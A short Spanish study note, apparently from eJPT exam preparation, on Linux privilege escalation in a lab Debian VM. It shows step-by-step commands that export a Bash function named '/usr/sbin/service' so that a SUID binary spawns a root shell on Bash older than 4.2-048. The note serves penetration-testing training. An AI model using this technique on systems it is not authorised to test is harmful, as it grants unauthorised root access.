- El ejecutable /usr/local/bin/suid-env2 es idéntico a /usr/local/bin/suid-env excepto que utiliza la ruta absoluta del ejecutable del servicio (/usr/sbin/service) para iniciar el servidor web apache2.

- Verifique esto con cadenas:

```
 strings /usr/local/bin/suid-env2
```

- En las versiones de Bash <4.2-048, es posible definir funciones de shell con nombres que se asemejen a las rutas de archivo y luego exportar esas funciones para que se utilicen en lugar de cualquier ejecutable real en esa ruta de archivo.

- Verifique que la versión de Bash instalada en la máquina virtual Debian sea inferior a 4.2-048:

```
/bin/bash --version
```

- Cree una función Bash con el nombre "/usr/sbin/service" que ejecute un nuevo shell Bash (usando -p para conservar los permisos) y exporte la función:

```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```

- Ejecute el ejecutable suid-env2 para obtener un shell raíz:

```
/usr/local/bin/suid-env2
```

enlace:
[[Preparacion-Ejpt]]
[[SUID - SGID Executables  Known - Exploits]]
[[SUID - SGID Executables - Environment Variables]]
[[SUID - SGID Executables - Shared Object Injection]]
[[SUID - SGID Executables - Abusing Shell Features (2)]]